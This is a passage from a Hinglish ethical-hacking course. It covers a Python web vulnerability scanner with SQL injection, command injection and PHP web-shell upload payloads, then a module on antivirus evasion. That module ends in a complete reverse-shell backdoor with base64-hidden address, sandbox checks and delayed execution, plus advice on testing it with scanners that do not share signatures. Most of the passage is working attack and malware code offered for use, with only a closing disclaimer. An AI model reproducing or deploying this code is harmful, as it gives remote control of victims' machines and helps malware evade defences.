|------|-------------|---------|
| **Error-based** | Database errors se information nikalna | `' OR 1=1--` |
| **Union-based** | UNION queries se data extract karna | `' UNION SELECT NULL--` |
| **Blind** | True/False responses se data nikalna | `' AND 1=1--` |
| **Time-based** | Delays se data confirm karna | `' AND SLEEP(5)--` |

### Line-by-Line Code:

```python
class Scanner:
    # ... previous code
    
    def test_sql_injection(self, url):
        # Line 3: SQL injection test function
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "' OR 1=1--",
            "1' UNION SELECT NULL--",
            "1' AND 1=2 UNION SELECT NULL--"
        ]
        # Lines 4-11: Common SQL injection payloads
        
        for payload in sql_payloads:
            # Line 12: Har payload test karo
            
            test_url = url.replace("=", f"={payload}")
            # Line 13: URL parameter mein payload inject karo
            
            try:
                response = self.session.get(test_url)
                # Line 15: Request bhejo
                
                sql_errors = [
                    "SQL syntax",
                    "mysql_fetch",
                    "ORA-01756",
                    "Microsoft SQL Server",
                    "ODBC SQL Server Driver",
                    "PostgreSQL",
                    "SQLite",
                    "syntax error"
                ]
                # Lines 17-25: Database error indicators
                
                for error in sql_errors:
                    if error.lower() in response.content.decode().lower():
                        # Line 27: Check karo error hai ya nahi
                        return True
                        # Line 28: Vulnerable hai!
                
            except Exception:
                continue
        
        return False

# Usage
scanner = Scanner("http://testphp.vulnweb.com", [])
if scanner.test_sql_injection("http://testphp.vulnweb.com/artists.php?artist=1"):
    print("[!] SQL Injection vulnerability found!")
```

**Expected Output:**
```
[!] SQL Injection vulnerability found!
URL: http://testphp.vulnweb.com/artists.php?artist=1' OR '1'='1
Error: You have an error in your SQL syntax...
```

---

## 11.4 Command Injection Detection

**Source:** NEW  
**Added:** OS command injection scanner

### Hinglish Explanation:

**Kya hai yeh?**  
Command Injection - OS commands inject karna web application mein. Server ka complete control mil sakta hai.

**Kyun zaroori hai?**  
Isse attacker server par arbitrary commands run kar sakta hai - files read/write, backdoor install, data exfiltration.

**Real-world Example:**  
Shellshock vulnerability (2014) - millions of servers vulnerable the. Bug bounty: $10,000+

### Line-by-Line Code:

```python
def test_command_injection(self, url):
    # Line 1: Command injection test function
    
    cmd_payloads = [
        "; ls",
        "| dir",
        "& whoami",
        "; cat /etc/passwd",
        "| type C:\\Windows\\win.ini",
        "`id`",
        "$(whoami)"
    ]
    # Lines 2-9: OS command payloads
    
    for payload in cmd_payloads:
        test_url = url + payload
        # Line 11: URL ke end mein payload add karo
        
        try:
            response = self.session.get(test_url)
            
            cmd_indicators = [
                "root:",
                "Administrator",
                "uid=",
                "gid=",
                "groups=",
                "C:\\Windows",
                "bin/bash"
            ]
            # Lines 16-23: Command output indicators
            
            for indicator in cmd_indicators:
                if indicator in response.content.decode():
                    return True
        
        except Exception:
            continue
    
    return False
```

**Expected Output:**
```
[!] Command Injection found!
URL: http://site.com/ping.php?ip=8.8.8.8; ls
Output: index.php config.php uploads/ ...
```

---

## 11.5 File Upload Vulnerability

**Source:** NEW  
**Added:** Unrestricted file upload detection

### Hinglish Explanation:

**Kya hai yeh?**  
File Upload Vulnerability - malicious files upload karna jo server par execute ho sakti hain.

**Kyun zaroori hai?**  
Web shells upload karke attacker server control kar sakta hai. Very common vulnerability.

**Real-world Example:**  
Facebook mein file upload bug - $10,000 bounty. Attacker PHP shell upload kar sakta tha.

### Line-by-Line Code:

```python
def test_file_upload(self, url):
    # Line 1: File upload test function
    
    malicious_content = "<?php system($_GET['cmd']); ?>"
    # Line 2: Simple PHP web shell
    
    test_files = [
        ("shell.php", malicious_content),
        ("shell.php.jpg", malicious_content),
        ("shell.pHP", malicious_content),
        ("shell.php%00.jpg", malicious_content),
        ("shell.php;.jpg", malicious_content)
    ]
    # Lines 3-8: Different bypass techniques
    
    for filename, content in test_files:
        # Line 9: Har technique try karo
        
        files = {'file': (filename, content)}
        # Line 10: File data prepare karo
        
        try:
            response = self.session.post(url, files=files)
            # Line 12: File upload karo
            
            if "uploaded successfully" in response.content.decode().lower():
                print(f"[!] File upload vulnerability: {filename} accepted!")
                return True
        
        except Exception:
            continue
    
    return False
```

**Expected Output:**
```
[!] File upload vulnerability: shell.php.jpg accepted!
Uploaded to: http://site.com/uploads/shell.php.jpg
Access: http://site.com/uploads/shell.php.jpg?cmd=whoami
```

---

## 11.6 Complete Scanner Code

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

class VulnerabilityScanner:
    def __init__(self, url, ignore_links):
        self.session = requests.Session()
        self.target_url = url
        self.target_links = []
        self.ignore_links = ignore_links
        self.vulnerabilities = []
    
    def crawl(self, url=None):
        if url is None:
            url = self.target_url
        
        href_links = self.extract_links_from(url)
        
        for link in href_links:
            link = urljoin(url, link)
            if "#" in link:
                link = link.split("#")[0]
            
            if self.target_url in link and link not in self.target_links:
                if link not in self.ignore_links:
                    self.target_links.append(link)
                    print(f"[*] Crawling: {link}")
                    self.crawl(link)
    
    def extract_links_from(self, url):
        try:
            response = self.session.get(url)
            return re.findall(r'href=["\']?([^"\' >]+)', response.text)
        except:
            return []
    
    def test_sql_injection(self, url):
        sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "admin'--"]
        
        for payload in sql_payloads:
            test_url = url.replace("=", f"={payload}")
            try:
                response = self.session.get(test_url)
                sql_errors = ["SQL syntax", "mysql_fetch", "ORA-01756"]
                
                for error in sql_errors:
                    if error.lower() in response.content.decode().lower():
                        return True
            except:
                continue
        return False
    
    def test_command_injection(self, url):
        cmd_payloads = ["; ls", "| dir", "& whoami"]
        
        for payload in cmd_payloads:
            test_url = url + payload
            try:
                response = self.session.get(test_url)
                cmd_indicators = ["root:", "Administrator", "uid="]
                
                for indicator in cmd_indicators:
                    if indicator in response.content.decode():
                        return True
            except:
                continue
        return False
    
    def run_scanner(self):
        print("\n[+] Starting vulnerability scan...")
        
        for link in self.target_links:
            print(f"\n[*] Testing: {link}")
            
            # SQL Injection
            if "=" in link:
                if self.test_sql_injection(link):
                    vuln = f"SQL Injection: {link}"
                    self.vulnerabilities.append(vuln)
                    print(f"[!] {vuln}")
            
            # Command Injection
            if "=" in link:
                if self.test_command_injection(link):
                    vuln = f"Command Injection: {link}"
                    self.vulnerabilities.append(vuln)
                    print(f"[!] {vuln}")
        
        print(f"\n[+] Scan complete. Found {len(self.vulnerabilities)} vulnerabilities.")
        return self.vulnerabilities

# Usage
scanner = VulnerabilityScanner("http://testphp.vulnweb.com", [])
scanner.crawl()
results = scanner.run_scanner()
```

---

# MODULE 12: Bypassing Antivirus (Complete)

## 12.1 Why Antivirus Detects Backdoors

**Source:** Pages 107-109 (Extended)

### Hinglish Explanation:

**Kya hai yeh?**  
Antivirus detection methods samajhna - signatures, heuristics, sandboxing, machine learning.

**Kyun zaroori hai?**  
Bina AV bypass ke backdoor useless hai. 99% Python backdoors detect ho jaate hain.

**Real-world Example:**  
APT groups custom malware banate hain jo months tak undetected rahta hai. Nation-state attacks mein yeh common hai.

### AV Detection Methods:

**1. Signature-based Detection:**
```
Known malware patterns match karta hai
Example: "socket.connect" + "subprocess" = Suspicious
```

**2. Heuristic Analysis:**
```
Suspicious behavior detect karta hai
Example: Registry modify + Network connection = Malware
```

**3. Sandbox Execution:**
```
Isolated environment mein run karke test karta hai
Example: File creates network connection = Block
```

**4. Machine Learning:**
```
AI models se patterns detect karta hai
Example: Code structure similar to known malware = Flag
```

### Detection Example:

```python
# This code will be DETECTED:
import socket
connection = socket.socket()
connection.connect(("attacker.com", 4444))

# Why?
# 1. "socket" keyword (signature)
# 2. Network connection (heuristic)
# 3. Suspicious IP (reputation)
# 4. No legitimate purpose (ML)
```

---

## 12.2 Code Obfuscation Techniques

**Source:** NEW

### Line-by-Line Code:

```python
# Technique 1: Variable Renaming
# Before:
attacker_ip = "10.0.2.15"
attacker_port = 4444

# After:
a = "10.0.2.15"
p = 4444

# Technique 2: String Encoding
import base64

# Before:
ip = "10.0.2.15"

# After:
ip = base64.b64decode("MTAuMC4yLjE1").decode()

# Technique 3: Character Building
# Before:
ip = "10.0.2.15"

# After:
ip = chr(49) + chr(48) + "." + chr(48) + ".2.15"

# Technique 4: Function Wrapping
def get_connection():
    import socket
    s = socket.socket()
    return s

c = get_connection()
c.connect(("10.0.2.15", 4444))

# Technique 5: Import Obfuscation
# Before:
import socket

# After:
__import__("socket")
```

---

## 12.3 PyArmor Encryption

**Source:** NEW

### Hinglish Explanation:

**Kya hai yeh?**  
PyArmor - Python code ko encrypt karta hai. Reverse engineering mushkil ho jaati hai.

**Kyun zaroori hai?**  
Source code protection + AV bypass dono milte hain.

### Commands:

```bash
# Install PyArmor
pip install pyarmor

# Encrypt single file
pyarmor obfuscate backdoor.py

# Output: dist/backdoor.py (encrypted)

# Encrypt with advanced options
pyarmor obfuscate --restrict 0 --no-cross-protection backdoor.py

# Convert to EXE
cd dist
pyinstaller --onefile backdoor.py
```

**Before Encryption:**
```python
import socket
connection = socket.socket()
connection.connect(("10.0.2.15", 4444))
```

**After Encryption:**
```python
from pytransform import pyarmor_runtime
pyarmor_runtime()
__pyarmor__(__name__, __file__, b'\x50\x59...')
```

---

## 12.4 FUD Concepts (Fully Undetectable)

**Source:** NEW

### Hinglish Explanation:

**Kya hai yeh?**  
FUD (Fully UnDetectable) - malware jo kisi bhi antivirus se detect nahi hota.

**Kyun zaroori hai?**  
Real-world attacks mein detection = failure. APT groups FUD malware use karte hain.

### FUD Techniques:

**1. Polymorphism:**
```python
# Har execution par code change hota hai
import random

def get_random_var():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))

var1 = get_random_var()  # Different every time
var2 = get_random_var()
```

**2. Metamorphism:**
```python
# Code structure change hota hai
if random.choice([True, False]):
    # Method 1
    connection.connect((ip, port))
else:
    # Method 2
    connection.connect((ip, port))
```

**3. Delayed Execution:**
```python
import time

# Sleep for 2 minutes (sandbox timeout)
time.sleep(120)

# Then execute malicious code
import socket
# ... backdoor code
```

**4. Environment Checks:**
```python
import os

def is_sandbox():
    # Check for VM indicators
    vm_files = [
        "C:\\windows\\System32\\Drivers\\Vmmouse.sys",
        "C:\\windows\\System32\\Drivers\\vmhgfs.sys"
    ]
    
    for file in vm_files:
        if os.path.exists(file):
            return True
    return False

if is_sandbox():
    # Exit silently
    import sys
    sys.exit()
else:
    # Execute backdoor
    import socket
    # ... malicious code
```

---

## 12.5 Complete FUD Backdoor

```python
#!/usr/bin/env python3
import socket
import subprocess
import json
import time
import os
import sys
import base64

class FUDBackdoor:
    def __init__(self):
        # Obfuscated variables
        self.a = base64.b64decode("MTAuMC4yLjE1").decode()
        self.p = 4444
        
        # Environment check
        if self.is_sandbox():
            sys.exit()
        
        # Delayed execution
        time.sleep(60)
        
        # Connect
        self.connect()
    
    def is_sandbox(self):
        vm_indicators = ["VMware", "VirtualBox", "QEMU"]
        
        try:
            info = subprocess.check_output("systeminfo", shell=True).decode()
            for indicator in vm_indicators:
                if indicator.lower() in info.lower():
                    return True
        except:
            pass
        
        return False
    
    def connect(self):
        try:
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.connect((self.a, self.p))
            self.run(c)
        except:
            pass
    
    def run(self, connection):
        while True:
            try:
                command = connection.recv(1024).decode()
                if command == "exit":
                    break
                
                result = subprocess.check_output(command, shell=True)
                connection.send(result)
            except:
                break

# Obfuscated execution
if __name__ == "__main__":
    b = FUDBackdoor()
```

---

## 12.6 Testing & VirusTotal

**Source:** NEW

### Hinglish Explanation:

**‚ö†Ô∏è CRITICAL WARNING:**  
VirusTotal par NEVER real backdoors upload karo! Signatures share ho jaate hain.

### Safe Testing Methods:

**1. Local Testing:**
```bash
# Windows Defender
# Settings ‚Üí Virus & threat protection ‚Üí Scan options
# Custom scan ‚Üí Select your backdoor.exe

# Result: Detected / Not Detected
```

**2. Private Scanners:**
- **Antiscan.me** - Private scanning (signatures share nahi karta)
- **NoDistribute.com** - Similar service
- **Jotti** - Multiple AV engines

**3. VM Testing:**
```
1. Clean Windows VM install karo
2. Antivirus install karo (Avast, AVG, Kaspersky)
3. Backdoor test karo
4. Snapshot restore karo
```

### Detection Rates:

| Technique | Detection Rate |
|-----------|----------------|
| Plain Python | 95% |
| PyInstaller | 85% |
| Obfuscation | 60% |
| PyArmor | 40% |
| FUD Techniques | 10-20% |

---

**[END OF ADVANCED MODULES]**

## Summary

**Module 11 Covered:**
‚úÖ SQL Injection detection  
‚úÖ Command Injection detection  
‚úÖ File Upload vulnerabilities  
‚úÖ Complete scanner implementation  

**Module 12 Covered:**
‚úÖ AV detection methods  
‚úÖ Code obfuscation techniques  
‚úÖ PyArmor encryption  
‚úÖ FUD concepts  
‚úÖ Safe testing methods  

**Ethical Reminder:**
‚ö†Ô∏è Yeh techniques sirf authorized testing ke liye hain. Unauthorized use serious crime hai.
